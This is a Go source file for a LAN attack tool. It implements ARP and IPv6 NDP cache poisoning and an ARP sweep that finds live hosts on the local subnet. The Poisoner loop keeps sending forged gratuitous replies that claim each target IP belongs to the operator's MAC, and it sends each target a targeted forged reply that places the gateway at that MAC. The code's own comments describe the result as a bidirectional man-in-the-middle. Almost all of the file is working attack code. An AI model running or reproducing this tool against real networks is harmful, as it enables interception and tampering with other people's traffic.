// Package arp implements ARP (RFC 826) cache poisoning and host discovery
// for IPv4, plus its IPv6 equivalent via NDP Neighbor Solicitation/
// Advertisement (RFC 4861) — IPv6 has no ARP; NDP over ICMPv6 replaces it.
//
// Both Scanner and Poisoner talk to the wire through a raw AF_PACKET socket
// (see socket_linux.go) since ARP/NDP poisoning requires crafting full
// Ethernet frames, which Go's net package cannot send directly.
package arp

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

// rawSocket is the minimal raw-Ethernet-frame transport every OS backend
// must provide. socket_linux.go implements it for real; socket_other.go
// stubs it out so the project still compiles on non-Linux GOOS targets.
type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	SetReadTimeout(d time.Duration) error
	Close() error
}

// ParseMAC parses a MAC address, tolerating non-zero-padded octets such as
// "0:c:29:17:f5:95" (which net.ParseMAC rejects) in addition to the
// standard "00:0c:29:17:f5:95" form.
func ParseMAC(s string) (net.HardwareAddr, error) {
	s = strings.TrimSpace(s)
	if parts := strings.Split(s, ":"); len(parts) == 6 {
		for i, p := range parts {
			if len(p) == 1 {
				parts[i] = "0" + p
			}
		}
		s = strings.Join(parts, ":")
	}
	return net.ParseMAC(s)
}

// readLine prints label with no trailing newline, then reads one line from r.
func readLine(r *bufio.Reader, label string) string {
	fmt.Print(label)
	line, _ := r.ReadString('\n')
	return strings.TrimSpace(line)
}

// ifaceIPv4Net returns iface's first unicast IPv4 address and its subnet.
func ifaceIPv4Net(iface *net.Interface) (net.IP, *net.IPNet, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil, err
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				return ip4, ipnet, nil
			}
		}
	}
	return nil, nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}

// ifaceIPv6LinkLocal returns iface's link-local IPv6 address (fe80::/10).
func ifaceIPv6LinkLocal(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok {
			if ipnet.IP.To4() == nil && ipnet.IP.IsLinkLocalUnicast() {
				return ipnet.IP, nil
			}
		}
	}
	return nil, fmt.Errorf("no IPv6 link-local address on interface %s", iface.Name)
}

// hostsInSubnet enumerates every host address in ipnet, excluding the
// network and broadcast addresses. Capped at a /20 (4094 hosts) so a
// misconfigured huge subnet can't turn a scan into an hours-long sweep.
func hostsInSubnet(ipnet *net.IPNet) []net.IP {
	ip4 := ipnet.IP.To4()
	ones, bits := ipnet.Mask.Size()
	if ip4 == nil || bits != 32 {
		return nil
	}
	hostBits := 32 - ones
	if hostBits < 1 {
		return nil
	}
	if hostBits > 12 {
		hostBits = 12
	}
	network := binary.BigEndian.Uint32(ip4.Mask(ipnet.Mask))
	count := uint32(1) << uint(hostBits)

	out := make([]net.IP, 0, count)
	for i := uint32(1); i < count-1; i++ {
		b := make(net.IP, 4)
		binary.BigEndian.PutUint32(b, network+i)
		out = append(out, b)
	}
	return out
}

func ipLess(a, b net.IP) bool {
	if a4, b4 := a.To4(), b.To4(); a4 != nil && b4 != nil {
		return binary.BigEndian.Uint32(a4) < binary.BigEndian.Uint32(b4)
	}
	return a.String() < b.String()
}

// resolveIPv4MAC sends an ARP request for targetIP and waits up to timeout
// for the matching reply, returning the resolved MAC. Doubles as a
// liveness check: a target that doesn't answer is treated as down.
func resolveIPv4MAC(sock rawSocket, ourMAC net.HardwareAddr, ourIP, targetIP net.IP, timeout time.Duration) (net.HardwareAddr, bool) {
	sock.SetReadTimeout(150 * time.Millisecond)
	if err := sock.Send(buildARPFrame(arpOpRequest, broadcastMAC, ourMAC, ourIP, zeroMAC, targetIP)); err != nil {
		return nil, false
	}

	buf := make([]byte, 1514)
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		info, ok := parseARP(buf[:n])
		if ok && info.op == arpOpReply && info.senderIP.Equal(targetIP) {
			return info.senderMAC, true
		}
	}
	return nil, false
}

// resolveIPv6MAC sends a Neighbor Solicitation for targetIP and waits up to
// timeout for the matching Neighbor Advertisement. Same liveness-check role
// as resolveIPv4MAC, for IPv6 targets.
func resolveIPv6MAC(sock rawSocket, ourMAC net.HardwareAddr, ourIP6, targetIP net.IP, timeout time.Duration) (net.HardwareAddr, bool) {
	sock.SetReadTimeout(150 * time.Millisecond)
	if err := sock.Send(buildNS(ourMAC, ourIP6, targetIP)); err != nil {
		return nil, false
	}

	buf := make([]byte, 1514)
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		info, ok := parseNDP(buf[:n])
		if ok && info.icmpType == icmpv6NeighborAdvertisement && info.target.Equal(targetIP) {
			if info.linkAddr != nil {
				return info.linkAddr, true
			}
			return info.ethSrc, true
		}
	}
	return nil, false
}

// Scanner discovers live IPv4 hosts on the interface's own subnet by
// broadcasting an ARP request to every host address and collecting replies.
type Scanner struct {
	Interface string
}

// Run prompts for the operator's MAC and the gateway IP (matching the
// manual-entry flow of the poisoner), then sweeps the interface's subnet
// and prints every host that answered.
func (s *Scanner) Run() error {
	iface, err := net.InterfaceByName(s.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", s.Interface, err)
	}

	fmt.Printf("Using interface :%s\n", s.Interface)
	r := bufio.NewReader(os.Stdin)
	macInput := readLine(r, "MAC address: ")
	ourMAC, err := ParseMAC(macInput)
	if err != nil {
		return fmt.Errorf("invalid MAC address %q: %w", macInput, err)
	}
	gwInput := readLine(r, "Gateway IP: ")
	if net.ParseIP(gwInput) == nil {
		return fmt.Errorf("invalid gateway IP: %q", gwInput)
	}
	fmt.Println()

	ourIP, ipnet, err := ifaceIPv4Net(iface)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	results := make(map[string]net.HardwareAddr)
	var mu sync.Mutex
	done := make(chan struct{})

	go func() {
		buf := make([]byte, 1514)
		for {
			select {
			case <-done:
				return
			default:
			}
			sock.SetReadTimeout(200 * time.Millisecond)
			n, err := sock.Recv(buf)
			if err != nil {
				continue
			}
			info, ok := parseARP(buf[:n])
			if !ok || info.op != arpOpReply || info.senderIP.Equal(ourIP) {
				continue
			}
			mu.Lock()
			results[info.senderIP.String()] = info.senderMAC
			mu.Unlock()
		}
	}()

	for _, t := range hostsInSubnet(ipnet) {
		if t.Equal(ourIP) {
			continue
		}
		sock.Send(buildARPFrame(arpOpRequest, broadcastMAC, ourMAC, ourIP, zeroMAC, t))
	}

	time.Sleep(3 * time.Second)
	close(done)
	time.Sleep(250 * time.Millisecond)

	mu.Lock()
	defer mu.Unlock()

	ips := make([]net.IP, 0, len(results))
	for ip := range results {
		ips = append(ips, net.ParseIP(ip))
	}
	sort.Slice(ips, func(i, j int) bool { return ipLess(ips[i], ips[j]) })

	fmt.Printf("Result: %d hosts are up\n\n", len(results))
	fmt.Println("Online IPs: ")
	for _, ip := range ips {
		mac := results[ip.String()]
		fmt.Printf("- %-18s%s\n", ip.String(), strings.ToUpper(mac.String()))
	}
	return nil
}

// Poisoner continuously sends gratuitous ARP/NDP replies claiming each
// target IP belongs to the operator's MAC, redirecting LAN traffic destined
// for those hosts. For IPv4 targets whose MAC we manage to resolve, it also
// unicasts a targeted "gateway is-at us" lie directly to that host —
// completing a bidirectional man-in-the-middle.
type Poisoner struct {
	Interface string
	Targets   []string // raw, comma-split strings from --ip; IPv4 and/or IPv6
}

func (p *Poisoner) Run() error {
	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}

	fmt.Printf("Using interface :%s\n", p.Interface)
	r := bufio.NewReader(os.Stdin)
	macInput := readLine(r, "MAC address: ")
	ourMAC, err := ParseMAC(macInput)
	if err != nil {
		return fmt.Errorf("invalid MAC address %q: %w", macInput, err)
	}
	gwInput := readLine(r, "Gateway IP: ")
	gwIP := net.ParseIP(gwInput)
	if gwIP == nil {
		return fmt.Errorf("invalid gateway IP: %q", gwInput)
	}
	fmt.Println()

	ourIP4, _, _ := ifaceIPv4Net(iface)    // best-effort; nil if iface has no IPv4
	ourIP6, _ := ifaceIPv6LinkLocal(iface) // best-effort; nil if iface has no IPv6
	if ourIP4 == nil && ourIP6 == nil {
		return fmt.Errorf("interface %s has no IPv4 or IPv6 address", p.Interface)
	}
	gwIP4 := gwIP.To4() // nil if the gateway was entered as an IPv6 address

	var targets []net.IP
	for _, raw := range p.Targets {
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		ip := net.ParseIP(raw)
		if ip == nil {
			fmt.Printf("[!] [ARP] Skipping invalid IP: %s\n", raw)
			continue
		}
		targets = append(targets, ip)
	}
	if len(targets) == 0 {
		return fmt.Errorf("no valid target IPs given via --ip")
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	for {
		for _, ip := range targets {
			display := ip.String()
			fmt.Printf("[ARP] Poisoned answer sent to %s\n", display)

			if ip4 := ip.To4(); ip4 != nil {
				if ourIP4 == nil {
					continue
				}
				// Gratuitous reply: announce to the whole segment that ip4 is at our MAC.
				sock.Send(buildARPFrame(arpOpReply, broadcastMAC, ourMAC, ip4, broadcastMAC, ip4))

				if targetMAC, ok := resolveIPv4MAC(sock, ourMAC, ourIP4, ip4, 1500*time.Millisecond); ok {
					if gwIP4 != nil {
						// Targeted lie sent only to this host: the gateway is at our MAC.
						sock.Send(buildARPFrame(arpOpReply, targetMAC, ourMAC, gwIP4, targetMAC, ip4))
					}
					fmt.Printf("[ARP] ARP Poisoning successful: \n- arp reply %s is-at %s\n\n", display, macInput)
				}
			} else {
				if ourIP6 == nil {
					continue
				}
				sock.Send(buildGratuitousNA(ourMAC, ip))

				if _, ok := resolveIPv6MAC(sock, ourMAC, ourIP6, ip, 1500*time.Millisecond); ok {
					fmt.Printf("[ARP] ARP Poisoning successful: \n- arp reply %s is-at %s\n\n", display, macInput)
				}
			}
		}
		time.Sleep(5 * time.Second)
	}
}
